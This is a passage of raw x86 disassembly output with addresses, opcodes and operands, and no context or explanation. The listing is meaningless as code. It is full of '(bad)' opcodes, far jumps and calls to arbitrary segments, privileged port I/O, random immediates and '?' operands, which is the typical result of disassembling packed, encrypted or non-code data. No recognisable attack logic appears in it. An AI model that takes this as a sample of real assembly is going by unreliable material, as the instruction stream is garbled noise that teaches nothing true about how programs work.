  408025:	sbb    DWORD PTR [eax+0x562c0402],ecx
  40802b:	dec    esi
  40802c:	xchg   esp,eax
  40802d:	mov    ebx,0x141d6592
  408032:	jl     0x407fce
  408034:	and    DWORD PTR [esi+eiz*4+0x26],ebx
  408038:	xor    al,0xbb
  40803a:	mov    bl,0x29
  40803c:	or     eax,0xe2661046
  408041:	dec    edx
  408042:	xchg   edi,eax
  408043:	jno    0x407fc6
  408045:	outs   dx,BYTE PTR ds:[esi]
  408046:	and    ch,BYTE PTR [ecx-0x60089e12]
  40804c:	mov    cl,0x65
  40804e:	xor    cl,BYTE PTR [ebx]
  408050:	fimul  WORD PTR [esi]
  408052:	add    al,0xc4
  408054:	mov    ds,WORD PTR [esi-0x64]
  408057:	mov    bl,0xf9
  408059:	cmp    ch,dh
  40805b:	lea    edx,[esi+0x3a]
  40805e:	sub    al,0xb5
  408060:	adc    eax,0x5ffd9042
  408065:	sbb    WORD PTR [ebp-0x347d9b89],si
  40806c:	cmc    
  40806d:	sbb    eax,0x13f86f
  408072:	sbb    BYTE PTR [eax],bl
  408074:	shl    DWORD PTR [edx],cl
  408076:	xor    al,0xec
  408078:	xor    al,0xf9
  40807a:	jmp    0x40803e
  40807c:	test   eax,0x23aa82a6
  408081:	and    ah,BYTE PTR [ebp+0x18223b73]
  408087:	sub    ch,BYTE PTR [esi-0x3d]
  40808a:	jb     0x408024
  40808c:	int3   
  40808d:	ret    
  40808e:	ficomp WORD PTR [edi+0x56]
  408091:	push   eax
  408092:	fstp   QWORD PTR [ebp+0x69]
  408095:	addr16 mov edx,0x11d31b44
  40809b:	or     DWORD PTR [ecx+0x4e],esi
  40809e:	(bad)  
  40809f:	mov    esi,0x3f783200
  4080a4:	(bad)  
  4080a5:	xchg   esp,eax
  4080a6:	sub    esi,DWORD PTR [ebx+0x46f4b684]
  4080ac:	iret   
  4080ad:	sbb    al,0xc7
  4080af:	sbb    al,ch
  4080b1:	loopne 0x4080aa
  4080b3:	xchg   esi,eax
  4080b4:	cmc    
  4080b5:	hlt    
  4080b6:	jle    0x408124
  4080b8:	sbb    eax,0x867fc277
  4080bd:	xchg   ecx,eax
  4080be:	data16 adc bl,BYTE PTR [esi]
  4080c1:	and    al,0x24
  4080c3:	loop   0x4080af
  4080c5:	mov    ecx,0x55904253
  4080ca:	lods   eax,DWORD PTR ds:[esi]
  4080cb:	fild   DWORD PTR [eax-0x1ffd0707]
  4080d1:	iret   
  4080d2:	and    DWORD PTR [ecx+ecx*2-0xb4caea1],0xffffffa0
  4080da:	pop    ebx
  4080db:	dec    ebx
  4080dc:	dec    ebp
  4080dd:	fisub  DWORD PTR [edi-0x74e1f66d]
  4080e3:	cmp    eax,0x99b6ca6f
  4080e8:	retf   0x73a1
  4080eb:	fidiv  DWORD PTR [edx]
  4080ed:	push   edi
  4080ee:	pop    ecx
  4080ef:	push   eax
  4080f0:	int    0xe4
  4080f2:	neg    DWORD PTR [esi+esi*2+0x3b]
  4080f6:	loope  0x40812f
  4080f8:	imul   edx,edi,0xffffffe6
  4080fb:	pop    esp
  4080fc:	ror    bh,cl
  4080fe:	ins    BYTE PTR es:[edi],dx
  4080ff:	push   ebx
  408100:	inc    edi
  408101:	leave  
  408102:	(bad)  
  408103:	mov    bh,0xf1
  408105:	enter  0xbe98,0x71
  408109:	inc    esp
  40810a:	jl     0x4080f2
  40810c:	xchg   esi,eax
  40810d:	jmp    FWORD PTR [edi-0x5eba3975]
  408113:	sub    al,0x8a
  408115:	nop
  408116:	xor    BYTE PTR [ebx],0x70
  408119:	gs mov bl,0x9f
  40811c:	push   edi
  40811d:	not    dh
  40811f:	mov    bh,0x84
  408121:	jge    0x408105
  408123:	push   eax
  408124:	dec    ebp
  408125:	xor    DWORD PTR [esi],0x35fc0dbd
  40812b:	push   ecx
  40812c:	or     DWORD PTR [esi+ecx*8-0x37888020],ebx
  408133:	mov    ch,0x6
  408135:	test   al,0xf
  408137:	loopne 0x4080fe
  408139:	iret   
  40813a:	sbb    al,0xe3
  40813c:	lahf   
  40813d:	mov    esp,0x4c1fa81c
  408142:	cld    
  408143:	out    dx,al
  408144:	gs add eax,0x33342ca8
  40814a:	xchg   BYTE PTR [eax-0x18],dl
  40814d:	imul   edi,DWORD PTR [edi],0x8f38377b
  408153:	test   BYTE PTR [ecx-0x365458b5],dh
  408159:	retf   
  40815a:	add    DWORD PTR [ecx+0x3],esp
  40815d:	aam    0x4d
  40815f:	retf   0xd5d
  408162:	cmp    DWORD PTR [ebp-0x3f],ebx
  408165:	mov    bl,BYTE PTR [ebx-0x4e]
  408168:	aaa    
  408169:	sub    esp,DWORD PTR [ebp+0x6f]
  40816c:	iret   
  40816d:	mov    esp,0xc2e6cc94
  408172:	cmp    eax,ebx
  408174:	cmp    ebx,edx
  408176:	pop    ebx
  408177:	mov    ah,0x16
  408179:	xor    BYTE PTR [ecx],0x10
  40817c:	mov    bl,0x46
  40817e:	mov    eax,ds:0x2c344540
  408183:	retf   0xd6ab
  408186:	sahf   
  408187:	mov    eax,ds:0x2de547e7
  40818c:	mov    ecx,0xd7c106f
  408191:	hlt    
  408192:	pop    eax
  408193:	and    BYTE PTR [edi+0x6d],0x38
  408197:	arpl   WORD PTR [ebp-0x3b],dx
  40819a:	jp     0x408174
  40819c:	aad    0xcf
  40819e:	jmp    0x40814e
  4081a0:	jl     0x408133
  4081a2:	pop    edi
  4081a3:	inc    edx
  4081a4:	pushf  
  4081a5:	into   
  4081a6:	sbb    eax,0x703170c5
  4081ab:	out    dx,eax
  4081ac:	leave  
  4081ad:	adc    eax,0xb83cde5c
  4081b2:	push   cs
  4081b3:	aaa    
  4081b4:	adc    bh,bl
  4081b6:	add    al,0x56
  4081b8:	inc    esp
  4081b9:	lods   eax,DWORD PTR ds:[esi]
  4081ba:	jg     0x4081e0
  4081bc:	adc    ebx,DWORD PTR [eax-0x55a1f199]
  4081c2:	xor    edx,DWORD PTR [esp+ebp*8+0x2f2d0eb5]
  4081c9:	std    
  4081ca:	retf   0x5c88
  4081cd:	xor    DWORD PTR [ecx-0xd9f9bb8],ecx
  4081d3:	push   ebx
  4081d4:	ret    
  4081d5:	mov    dl,0xb2
  4081d7:	(bad)  
  4081d8:	adc    ch,BYTE PTR [edi+0x6d388761]
  4081de:	mov    bl,0x92
  4081e0:	mov    bh,0xf7
  4081e2:	retf   0x81b6
  4081e5:	add    dh,bh
  4081e7:	jle    0x4081e1
  4081e9:	hlt    
  4081ea:	xchg   esp,eax
  4081eb:	into   
  4081ec:	call   0x882f:0xb7400500
  4081f3:	pop    ecx
  4081f4:	and    al,0x94
  4081f6:	inc    edi
  4081f7:	adc    BYTE PTR [edx+0x9dfcc11],bl
  4081fd:	xor    eax,0x28a0554f
  408202:	pop    es
  408203:	mov    ds:0x23a4568a,eax
  408208:	sub    ebp,ebx
  40820a:	dec    eax
  40820b:	out    0xee,eax
  40820d:	cmp    BYTE PTR [ecx-0x65269d79],bh
  408213:	das    
  408214:	ja     0x408240
  408216:	mov    dl,0x6d
  408218:	rcl    DWORD PTR [ebx+0x4b],0xa6
  40821c:	arpl   WORD PTR [ebp+edi*8+0x56c2dbc8],sp
  408223:	push   cs
  408224:	jbe    0x408290
  408226:	pop    DWORD PTR [ebx-0x67a26325]
  40822c:	adc    esp,0xffffffe4
  40822f:	les    esp,FWORD PTR [ebx+ecx*4-0xcca2149]
  408236:	cmp    BYTE PTR [edi+0x4c],cl
  408239:	ret    
  40823a:	xchg   ebx,eax
  40823b:	hlt    
  40823c:	lods   eax,DWORD PTR ds:[esi]
  40823d:	xor    dh,BYTE PTR [ebx+0x35]
  408240:	pop    ebx
  408241:	cmp    esi,DWORD PTR [ecx+0x2439ba23]
  408247:	sub    bl,bh
  408249:	push   ebx
  40824a:	xor    DWORD PTR [ebx],0xffffffdf
  40824d:	jmp    0x408289
  40824f:	mov    ds:0x42fbee9c,al
  408254:	shrd   DWORD PTR [eax-0x6e],ecx,0x62
  408259:	xor    bl,bl
  40825b:	push   ds
  40825c:	adc    al,0x3
  40825e:	in     eax,0x8c
  408260:	inc    edx
  408261:	cmc    
  408262:	adc    eax,0x753f9c43
  408267:	call   0x2c07:0x22f7b298
  40826e:	and    eax,0xa3234d68
  408274:	mov    edx,0x6163d177
  408279:	dec    ecx
  40827a:	int3   
  40827b:	sbb    BYTE PTR [ebx-0x13fc1a2e],dl
  408281:	mov    ds:0x983da403,al
  408286:	pop    ebx
  408287:	lds    ebx,FWORD PTR [ebx-0x3980f11a]
  40828d:	mul    DWORD PTR [ebp-0x21b1cbc0]
  408293:	xor    BYTE PTR ds:0x3fe5091f,0x27
  40829a:	add    DWORD PTR ds:[edx],edx
  40829d:	sbb    DWORD PTR [edi+0x7cfa3060],0xffffffb4
  4082a4:	rcr    BYTE PTR [esi+0x66],1
  4082a7:	sub    esi,DWORD PTR [edx+0x6d5fbe9e]
  4082ad:	dec    ebp
  4082ae:	pop    edi
  4082af:	xchg   DWORD PTR [edx-0xd959c67],edi
  4082b5:	lods   al,BYTE PTR ds:[esi]
  4082b6:	push   0x949abb1d
  4082bb:	sub    BYTE PTR [ebp-0xb719d7c],0x52
  4082c2:	xor    edi,DWORD PTR [edx]
  4082c4:	(bad)  
  4082c5:	sbb    al,BYTE PTR [ebx-0x70]
  4082c8:	mov    WORD PTR [esi-0x8],fs
  4082cb:	ss cwde 
  4082cd:	jo     0x40829d
  4082cf:	add    DWORD PTR [edi+0x6f],eax
  4082d2:	add    dh,BYTE PTR [edx]
  4082d4:	jno    0x408327
  4082d6:	xor    BYTE PTR [edx-0x18153512],dh
  4082dc:	loop   0x40831a
  4082de:	mov    BYTE PTR [eax-0x18],bl
  4082e1:	jns    0x4082a1
  4082e3:	dec    esp
  4082e4:	inc    edx
  4082e5:	call   0x378d:0xce74a24
  4082ec:	fldenv [edi]
  4082ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082ef:	jmp    0x6d32:0x92e641ec
  4082f6:	pop    edx
  4082f7:	fbld   TBYTE PTR [esi+ebp*2]
  4082fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082fb:	push   ds
  4082fc:	pushf  
  4082fd:	sbb    eax,0x4489c08d
  408302:	mov    ds:0x438ce9e1,al
  408307:	inc    esi
  408308:	sbb    bh,al
  40830a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40830b:	cmp    DWORD PTR [esi+0x105fe074],edi
  408311:	pushf  
  408312:	cmp    al,0x16
  408314:	aam    0x1a
  408316:	pop    es
  408317:	cmp    DWORD PTR [ebp+0x6c],0x7a
  40831b:	sub    DWORD PTR [edi+0xd],0xffffffda
  40831f:	sub    ah,BYTE PTR [edx]
  408321:	lea    edx,[esi-0x16f803a4]
  408327:	mov    al,ds:0x706f7973
  40832c:	call   0xd55cfd62
  408331:	popf   
  408332:	dec    eax
  408333:	int    0xb3
  408335:	(bad)  
  408336:	xor    eax,0xb9addc00
  40833b:	test   eax,0x5a15714d
  408340:	in     al,0xe1
  408342:	mov    ?,WORD PTR [edx+eax*1-0x6a]
  408346:	or     eax,0x92d745b4
  40834b:	mov    al,ds:0x41818628
  408350:	mov    BYTE PTR [eax],ah
  408352:	int    0x8a
  408354:	test   eax,0xd74ad81c
  408359:	dec    edx
  40835a:	xor    eax,0x11e006ed
  40835f:	out    0xc2,eax
  408361:	jno    0x40835a
  408363:	aam    0x4f
  408365:	sbb    BYTE PTR [ebx+0x4c],bh
  408368:	pop    es
  408369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40836a:	or     BYTE PTR [ecx+0x6633348c],ah
  408370:	xlat   BYTE PTR ds:[ebx]
  408371:	adc    al,0x2f
  408373:	and    DWORD PTR [ebx],ebx
  408375:	inc    esi
  408376:	mov    ebp,0xc21e01c5
  40837b:	sub    DWORD PTR [eax],0x3ffd21d5
  408381:	sub    edi,DWORD PTR [bp+si-0x33]
  408385:	fs xchg ecx,eax
  408387:	xchg   ebx,eax
  408388:	(bad)  
  408389:	cli    
  40838a:	pop    esi
  40838b:	add    BYTE PTR [edx-0x20],ch
  40838e:	mov    esi,0xddcabc58
  408393:	pop    esi
  408394:	jo     0x4083cc
  408396:	popf   
  408397:	push   es
  408398:	xchg   esi,eax
  408399:	xor    al,0x97
  40839b:	push   cs
  40839c:	mov    edi,DWORD PTR [edi+0x78]
  40839f:	adc    al,0x50
  4083a1:	mov    al,0x26
  4083a3:	cmp    eax,0x87918cde
  4083a8:	int    0xa1
  4083aa:	aam    0x8c
  4083ac:	mov    ds:0x91698e75,eax
  4083b1:	retf   
  4083b2:	sub    eax,0x7781ecbd
  4083b7:	stos   BYTE PTR es:[edi],al
  4083b8:	push   ds
  4083b9:	sbb    DWORD PTR [edi+0x52],edx
  4083bc:	in     eax,dx
  4083bd:	push   cs
  4083be:	rol    BYTE PTR [ecx],0xc
  4083c1:	dec    esi
  4083c2:	sbb    ebx,DWORD PTR [esi]
  4083c4:	xor    al,BYTE PTR [esi]
  4083c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083c7:	push   ebp
  4083c8:	mov    cl,0x6d
  4083ca:	repz sub dl,0xa9
  4083ce:	(bad)  
  4083cf:	xchg   edi,eax
  4083d0:	dec    ebx
  4083d1:	in     eax,dx
  4083d2:	push   esi
  4083d3:	int    0xb8
  4083d5:	adc    al,0x10
  4083d7:	push   ecx
  4083d8:	lea    edi,[edi+eiz*4+0x5]
  4083dc:	adc    cl,BYTE PTR [edi+0x43]
  4083df:	sub    BYTE PTR ds:0x77da5f2c,ah
  4083e5:	mov    eax,ds:0x125372ea
  4083ea:	and    BYTE PTR [eax+0x32],0x94
  4083ee:	sar    DWORD PTR [edi],0x90
  4083f1:	sbb    ebp,edx
  4083f3:	jne    0x408426
  4083f5:	xchg   edi,eax
  4083f6:	or     esi,esi
  4083f8:	loopne 0x4083a0
  4083fa:	xor    BYTE PTR [ebp-0x4a7dc8a9],0x3f
  408401:	stc    
  408402:	aas    
  408403:	xor    eax,0x62cd2a6f
  408408:	cmp    eax,0xf1514a46
  40840d:	mov    eax,ds:0x1fd06383
  408412:	inc    ecx
  408413:	outs   dx,BYTE PTR ds:[esi]
  408414:	stos   BYTE PTR es:[edi],al
  408415:	pop    edi
  408416:	xchg   edi,eax
  408417:	scas   eax,DWORD PTR es:[edi]
  408418:	dec    edi
  408419:	push   ds
  40841a:	bnd jl 0x408485
  40841d:	sub    al,0x97
  40841f:	loop   0x4083fb
  408421:	mov    bl,0x4
  408423:	inc    eax
  408424:	pop    es
  408425:	ret    
  408426:	fisttp DWORD PTR [ebp+0x63427be]
  40842c:	sub    al,0x45
  40842e:	cdq    
  40842f:	add    DWORD PTR [edx-0x5b54cef3],ebx
  408435:	lahf   
  408436:	dec    esi
  408437:	test   BYTE PTR [ebp-0x33a91e32],bh
  40843d:	xor    bl,ah
  40843f:	inc    ecx
  408440:	sub    ch,al
  408442:	add    DWORD PTR [ebx-0x6d2edc5e],0x70
  408449:	mov    ch,0x20
  40844b:	cmp    ebx,DWORD PTR [ebp+edi*4+0x1e]
  40844f:	rcr    DWORD PTR [edi+ecx*4+0x21b2d8f9],1
  408456:	call   0x13a8:0x10c5abc3
  40845d:	xchg   esi,eax
  40845e:	jb     0x408482
  408460:	inc    ebp
  408461:	inc    ebx
  408462:	add    eax,0x201fc225
  408467:	fnsave [ebx+0x33]
  40846a:	pop    edx
  40846b:	nop
  40846c:	aam    0x81
  40846e:	dec    ecx
  40846f:	dec    ebx
  408470:	sbb    eax,0x3b418945
  408475:	in     al,dx
  408476:	aam    0xc3
  408478:	or     eax,0x48a3a5c7
  40847d:	jmp    0x4084ce
  40847f:	int    0x2
  408481:	ror    eax,0x20
  408484:	mov    al,0xf6
  408486:	xchg   ebx,eax
  408487:	stos   DWORD PTR es:[edi],eax
  408488:	mov    ah,0x60
  40848a:	pop    es
  40848b:	sti    
  40848c:	(bad)  
  40848e:	and    DWORD PTR [ebp+eax*8-0x7f685e21],ecx
  408495:	mov    ebx,0xaf1586d1
  40849a:	jmp    0x9311:0xdbf4f388
  4084a1:	std    
  4084a2:	cwde   
  4084a3:	aam    0x95
  4084a5:	push   eax
  4084a6:	mov    BYTE PTR [edx-0x6a],bl
  4084a9:	fldcw  WORD PTR [esi-0x50]
  4084ac:	xchg   ebx,eax
  4084ad:	xor    al,0x75
  4084af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084b0:	(bad)  
  4084b1:	mov    bh,0x9d
  4084b3:	mov    edi,0x5a6e8c30
  4084b8:	sbb    al,0xb
  4084ba:	into   
  4084bb:	leave  
  4084bc:	shl    DWORD PTR [ebx+eax*2],cl
  4084bf:	pop    ebx
  4084c0:	fsub   DWORD PTR [edx+esi*4]
  4084c3:	pop    ebp
  4084c4:	lds    eax,FWORD PTR ds:0x13a41cd5
  4084ca:	dec    esp
  4084cb:	in     al,0x82
  4084cd:	std    
  4084ce:	push   ss
  4084cf:	scas   eax,DWORD PTR es:[edi]
  4084d0:	inc    edi
  4084d1:	add    esi,ecx
  4084d3:	popf   
  4084d4:	cmp    BYTE PTR [si+0x4716],bh
  4084d9:	jmp    0xf134:0x14d9c39
  4084e0:	or     al,0xd6
  4084e2:	daa    
  4084e3:	jge    0x408504
  4084e5:	or     edx,ecx
  4084e7:	(bad)  
  4084e8:	std    
  4084e9:	jecxz  0x408509
  4084eb:	sbb    BYTE PTR [eax+ebp*4],cl
  4084ee:	pop    eax
  4084ef:	cwde   
  4084f0:	shl    edx,1
  4084f2:	sbb    ebx,DWORD PTR [ecx]
  4084f4:	or     BYTE PTR [edi-0x36],ah
  4084f7:	jp     0x408552
  4084f9:	scas   eax,DWORD PTR es:[edi]
  4084fa:	cmp    bl,bh
  4084fc:	pop    ds
  4084fd:	mov    ?,WORD PTR [esi-0x21fd2c92]
  408503:	outs   dx,BYTE PTR ds:[esi]
  408504:	stos   BYTE PTR es:[edi],al
  408505:	cld    
  408506:	ja     0x4084d4
  408508:	arpl   WORD PTR [esp+ebx*1-0x1c5f4882],cx
  40850f:	in     eax,0x58
  408511:	dec    ecx
  408512:	rep lods eax,DWORD PTR ds:[esi]
  408514:	or     BYTE PTR [eax-0x66],dl
  408517:	scas   al,BYTE PTR es:[edi]
  408518:	jae    0x4084d7
  40851a:	mov    ah,0x89
  40851c:	mov    ecx,0xb368a020
  408521:	pop    es
  408522:	sub    eax,0x1ec7713d
  408527:	retf   
  408528:	xor    ebp,edx
  40852a:	stc    
  40852b:	dec    ebx
  40852c:	shl    DWORD PTR [edx],cl
  40852e:	inc    edi
  40852f:	neg    BYTE PTR [ecx-0x43]
  408532:	aaa    
  408533:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  408535:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408537:	mov    al,0xfb
  408539:	fldcw  WORD PTR [ebp-0x714916b8]
  40853f:	ficom  WORD PTR [ebp+0x772dfcf4]
  408545:	cmp    eax,0x13ef0d08
  40854a:	push   0xffffffff
  40854c:	and    al,0x98
  40854e:	repz shl bh,1
  408551:	adc    ch,BYTE PTR [eax-0x65]
  408554:	shl    DWORD PTR [ebx],cl
  408556:	jns    0x408547
  408558:	inc    eax
  408559:	jo     0x4085d5
  40855b:	popa   
  40855c:	cmc    
  40855d:	cmc    
  40855e:	mov    dh,0xea
  408560:	adc    dl,bl
  408562:	push   0x2404d799
  408567:	xchg   ebx,eax
  408568:	repnz push edx
  40856a:	cmp    eax,0xda613b7e
  40856f:	push   edi
  408570:	push   edi
  408571:	cli    
  408572:	fmul   DWORD PTR [ebx-0x57]
  408575:	pop    edx
  408576:	sbb    edi,DWORD PTR [edx-0x5fab8fc]
  40857c:	inc    edx
  40857d:	loope  0x408523
  40857f:	lods   eax,DWORD PTR ds:[esi]
  408580:	fld    QWORD PTR [esi-0x62]
  408583:	lahf   
  408584:	vpmaddwd ymm4,ymm7,YMMWORD PTR [edi]
  408588:	in     eax,dx
  408589:	jge    0x4085bb
  40858b:	and    al,ch
  40858d:	mov    esi,0xba2b0cfc
  408592:	lahf   
  408593:	xchg   ebp,eax
  408594:	xlat   BYTE PTR ds:[ebx]
  408595:	sbb    ebx,DWORD PTR [ebx-0x57]
  408598:	pop    edi
  408599:	imul   edx,DWORD PTR [eax-0x3f],0xcde2e3fd
  4085a0:	aas    
  4085a1:	or     al,0xa3
  4085a3:	pop    edi
  4085a4:	ins    DWORD PTR es:[edi],dx
  4085a5:	dec    esi
  4085a6:	mov    bl,0x9
  4085a8:	js     0x4085bc
  4085aa:	loope  0x4085fe
  4085ac:	lock xchg esi,eax
  4085ae:	sbb    eax,0x449a11cd
  4085b3:	mov    BYTE PTR [esi],cl
  4085b5:	pop    ds
  4085b6:	popa   
  4085b7:	or     DWORD PTR [edi+0x584443f9],edi
  4085bd:	dec    DWORD PTR [ebp+0x6c8b74ee]
  4085c3:	cmp    edx,DWORD PTR [ecx]
  4085c5:	mov    bh,0x5c
  4085c7:	jbe    0x4085c4
  4085c9:	inc    ecx
  4085ca:	jg     0x408578
  4085cc:	mov    BYTE PTR [esi+0x3f],ch
  4085cf:	(bad)  
  4085d0:	add    al,0x10
  4085d2:	dec    edx
  4085d3:	sub    edi,DWORD PTR [edx+0x7b]
  4085d6:	push   0x3340e790
  4085db:	mov    ds:0xfcdc209d,al
  4085e0:	adc    al,0x3d
  4085e2:	dec    edx
  4085e3:	test   DWORD PTR [ebp+0x3],edx
  4085e6:	test   eax,0x3a583a05
  4085eb:	outs   dx,BYTE PTR ds:[esi]
  4085ec:	or     esp,DWORD PTR ds:0x56f5c0a5
  4085f2:	cmp    al,ch
  4085f4:	stos   DWORD PTR es:[edi],eax
  4085f5:	or     eax,0x8754fc2e
  4085fa:	mov    eax,ds:0xf8def6b9
  4085ff:	and    al,0xfc
  408601:	cmp    eax,0x359052a9
  408606:	pop    ebp
  408607:	push   ds
  408608:	aaa    
  408609:	dec    esp
  40860a:	test   DWORD PTR [esi+0xb],ebp
  40860d:	fild   QWORD PTR [ecx+0x3685ec51]
  408613:	sub    eax,0x694f8273
  408618:	jg     0x408635
  40861a:	stc    
  40861b:	rcl    DWORD PTR [ebx],1
  40861d:	loop   0x408697
  40861f:	sbb    eax,0x18e8b2c0
  408624:	jp     0x4086a0
  408626:	inc    edi
  408627:	(bad)  
  408628:	cmp    ax,0xca98
  40862c:	nop
  40862d:	xor    DWORD PTR [edi],0x6364f464
  408633:	int3   
  408634:	mov    cl,0x7e
  408636:	cmp    ch,BYTE PTR [edi]
  408638:	adc    eax,0x42d9c44e
  40863d:	xor    eax,0x343d8a29
  408642:	mov    esi,0x65f46dea
  408647:	xchg   edx,eax
  408648:	in     eax,dx
  408649:	adc    BYTE PTR ds:0xd68f935c,dh
  40864f:	xor    dh,al
  408651:	loope  0x40866c
  408653:	pop    ds
  408654:	loopne 0x408691
  408656:	lahf   
  408657:	addr16 das 
  408659:	push   esp
  40865a:	xor    ebp,eax
  40865c:	dec    edi
  40865d:	out    dx,al
  40865e:	pop    ebx
  40865f:	ret    0x56f2
  408662:	mov    WORD PTR [edi-0x7a],ss
  408665:	int3   
  408666:	mov    al,bh
  408668:	fs jbe 0x4086de
  40866b:	leave  
  40866c:	aaa    
  40866d:	sbb    al,0xdb
  40866f:	mov    ds:0x4933b7bd,al
  408674:	inc    edi
  408675:	scas   eax,DWORD PTR es:[edi]
  408676:	xor    al,0x96
  408678:	pop    DWORD PTR [ebx+0x3]
  40867b:	out    0xb3,al
  40867d:	mov    eax,0x8c20c9eb
  408682:	inc    ecx
  408683:	pop    ebx
  408684:	inc    ebx
  408685:	int3   
  408686:	aas    
  408687:	ret    
  408688:	ss test al,0x56
  40868b:	repz and ebx,DWORD PTR [ebp-0x73a3d20e]
  408692:	mov    ebp,0x51169177
  408697:	xchg   edx,eax
  408698:	scas   eax,DWORD PTR es:[edi]
  408699:	mov    dh,0x37
  40869b:	imul   ebp,edi,0xffffffe9
  40869e:	xor    eax,0x2dbde704
  4086a3:	add    cl,BYTE PTR [esi]
  4086a5:	pop    ebx
  4086a6:	and    BYTE PTR [edi+0x3d],dh
  4086a9:	and    bl,BYTE PTR [edi]
  4086ab:	inc    esi
  4086ac:	das    
  4086ad:	dec    ebx
  4086ae:	cmc    
  4086af:	sbb    BYTE PTR [edi+0x4],ch
  4086b2:	dec    eax
  4086b3:	pop    ss
  4086b4:	loop   0x40863b
  4086b6:	add    eax,0x6b56ca63
  4086bb:	sub    al,0x83
  4086bd:	lods   eax,DWORD PTR ds:[esi]
  4086be:	sti    
  4086bf:	repnz xchg dx,ax
  4086c2:	push   es
  4086c3:	or     eax,0x8842bba1
  4086c8:	sbb    ebx,esi
  4086ca:	pop    ebx
  4086cb:	push   eax
  4086cc:	or     BYTE PTR [ebp-0x14f9d176],cl
  4086d2:	pop    edi
  4086d3:	sub    DWORD PTR [edx+ebx*2+0x5e],ebp
  4086d7:	dec    ebx
  4086d8:	sahf   
  4086d9:	push   ds
  4086da:	cmp    ecx,DWORD PTR [edi-0x2b834a33]
  4086e0:	or     edi,DWORD PTR [ecx+ecx*4-0x41b3ebe]
  4086e7:	call   0x899a:0x81f08902
  4086ee:	(bad)  
  4086ef:	jmp    0xc203:0xf069abb0
  4086f6:	mov    ds:0x9131f636,al
  4086fb:	sub    dl,BYTE PTR [ecx-0x517c65f7]
  408701:	or     al,0x4a
  408703:	adc    BYTE PTR [ecx+0x1600980c],0xe0
  40870a:	out    dx,al
  40870b:	add    DWORD PTR [ecx+0x72],edx
  40870e:	loopne 0x408780
  408710:	jge    0x408732
  408712:	and    al,0xa3
  408714:	and    eax,0xd0716473
  408719:	adc    ecx,DWORD PTR [ecx-0xf]
  40871c:	sti    
  40871d:	jmp    0x4086ee
  40871f:	sub    esi,esi
  408721:	push   edx
  408722:	and    esp,DWORD PTR [ebx+0x12e964fb]
  408728:	add    DWORD PTR [esi+0x38],edx
  40872b:	or     bh,BYTE PTR [edi+0x5556f868]
  408731:	add    DWORD PTR [esi],0x85976f4c
  408737:	inc    ecx
  408738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408739:	and    eax,DWORD PTR [edx]
  40873b:	mov    ebx,esp
  40873d:	xchg   edi,eax
  40873e:	mov    ebp,0x89bba960
  408743:	test   al,0xe0
  408745:	mov    ds:0xcc03d4e7,eax
  40874a:	jnp    0x40876e
  40874c:	leave  
  40874d:	mov    ch,0x14
  40874f:	mov    DWORD PTR [eax+0x32],esp
  408752:	inc    esp
  408753:	dec    edi
  408754:	nop
  408755:	retf   0xf246
  408758:	out    0x92,eax
  40875a:	shl    dh,cl
  40875c:	mov    cl,BYTE PTR [edx-0x50]
  40875f:	mov    esp,0xa221d95b
  408764:	aad    0x94
  408766:	pop    esp
  408767:	(bad)  
  408768:	cmc    
  408769:	repz mov ebx,0xa697b86c
  40876f:	not    DWORD PTR [ecx+0x711716f6]
  408775:	retf   0x537e
  408778:	ds sbb dl,0x8a
  40877c:	pop    eax
  40877d:	and    eax,DWORD PTR [eax]
  40877f:	lods   eax,DWORD PTR ds:[esi]
  408780:	mov    bh,0x3a
  408782:	dec    ecx
  408783:	mov    DWORD PTR [eax+0x12],esp
  408786:	fs popa 
  408788:	xchg   ebx,eax
  408789:	fstp   QWORD PTR [ecx+0x20845d05]
  40878f:	ficomp DWORD PTR ds:0x51f6feca
  408795:	jge    0x40872d
  408797:	mov    ebx,0x62305b9f
  40879c:	mov    ecx,0x1fa563d1
  4087a1:	jae    0x4087ab
  4087a3:	sub    BYTE PTR [ecx],0xb7
  4087a6:	mov    dh,0xf6
  4087a8:	fstp   QWORD PTR fs:[ecx-0x7e]
  4087ac:	shr    BYTE PTR [ebx-0x22],1
  4087af:	(bad)  
  4087b0:	dec    eax
  4087b1:	xor    DWORD PTR [ebx+ecx*2-0x3bb9e649],esi
  4087b8:	fidiv  DWORD PTR [esi-0x7a]
  4087bb:	loope  0x4087d4
  4087bd:	push   edi
  4087be:	pusha  
  4087bf:	rcr    BYTE PTR ds:0x3a06210a,0x6e
  4087c6:	ret    
  4087c7:	inc    esp
  4087c8:	bound  ebp,QWORD PTR [esi-0xb]
  4087cb:	lea    eax,ds:0xa08f5706
  4087d1:	cmp    cl,BYTE PTR [esi+0x4ae03802]
  4087d7:	aaa    
  4087d8:	hlt    
  4087d9:	mov    bl,0x15
  4087db:	mov    dh,0xc7
  4087dd:	xlat   BYTE PTR ds:[ebx]
  4087de:	and    esi,DWORD PTR [ebx]
  4087e0:	adc    ebp,eax
  4087e2:	xchg   edx,eax
  4087e3:	cmp    DWORD PTR cs:0xb62a52a6,0xffffffcb
  4087eb:	shl    DWORD PTR [edx+0x4e],cl
  4087ee:	sub    al,0xfb
  4087f0:	stc    
  4087f1:	push   0x558b7b
  4087f6:	outs   dx,BYTE PTR ds:[esi]
  4087f7:	imul   edi,DWORD PTR [esi],0x5c387185
  4087fd:	mov    dh,0x67
  4087ff:	push   ss
  408800:	mov    edx,fs
  408802:	and    DWORD PTR [eiz*4+0x18a488fc],esi
  408809:	dec    esi
  40880a:	pop    esp
  40880b:	frstor [edi+ebp*4]
  40880e:	(bad)  
  40880f:	(bad)  
  408810:	cmc    
  408811:	int3   
  408812:	mov    edx,0x581c1499
  408817:	mov    edi,0xa9178a5c
  40881c:	jle    0x4087f2
  40881e:	or     al,0xe
  408820:	push   esi
  408821:	test   eax,0x290707f7
  408826:	fld    TBYTE PTR [ecx]
  408828:	daa    
  408829:	arpl   WORD PTR [ebx-0x59],ax
  40882c:	arpl   bx,ax
  40882e:	es jg  0x408872
  408831:	in     al,dx
  408832:	mov    eax,0xed7ea166
  408837:	(bad)  
  408838:	or     dh,BYTE PTR [eax+ebp*4]
  40883b:	inc    esp
